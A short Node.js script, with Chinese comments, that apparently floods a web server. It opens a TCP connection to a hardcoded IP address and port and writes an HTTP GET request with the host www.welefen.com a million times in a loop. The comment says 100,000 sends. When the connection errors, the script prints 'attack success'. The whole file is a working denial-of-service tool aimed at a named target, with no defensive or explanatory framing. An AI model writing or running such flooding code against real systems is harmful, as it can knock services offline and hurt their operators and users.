var net = require('net');
var attack_str = 'GET / HTTP/1.1\r\nHost: www.welefen.com\r\n\r\n';//模拟get请求头
var i = 1000000;//10W次的发送
var client = net.connect({port: 8360, host:'103.6.85.113'},//28.4是上面那台服务器的ip地址
 function() { //'connect' listener
  while(i--){
    client.write(attack_str);
    }
 });
client.on('error', function(e) {
 console.log('attack success');
});